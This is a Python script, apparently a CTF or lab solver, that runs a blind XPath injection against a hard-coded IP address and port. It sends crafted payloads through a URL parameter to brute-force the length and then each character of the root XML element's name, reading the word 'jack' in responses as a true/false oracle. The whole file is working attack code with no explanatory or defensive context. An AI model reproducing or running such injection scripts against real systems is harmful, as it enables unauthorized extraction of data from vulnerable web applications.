import re
import requests
import string

url = "http://58.240.236.231:10001/zr/?p=xxx&u="
stringlist = 'abcdefghijklmnopqrstuvwxyz0123456789-+'
def length():
    for i in range(30):
        payload = "']|//*[string-length(name(/*[1]))={}]|/x['".format(i)
        print(payload)
        try:
            r = requests.get(url + payload).text
            if "jack" in r:
                print("长度=",i)
                return i
            if i == stringlist[-1]:
                return
        except:
            pass

def name(len):
    result = ""
    for l in range(len+1):
        for i in stringlist:
            payload = "']|//*[substring(name(/*[1]),{},1)='{}']|/x['".format(l,i)
            # print(payload)
            try:
                r = requests.get(url + payload).text
                if "jack" in r:
                    result += i
                    print(result)
                    break
                if i == stringlist[-1]:
                    print("finish")
                    break
            except:
                pass

if __name__ == '__main__':
    len = length()
    # print("长度:")
    name(len)


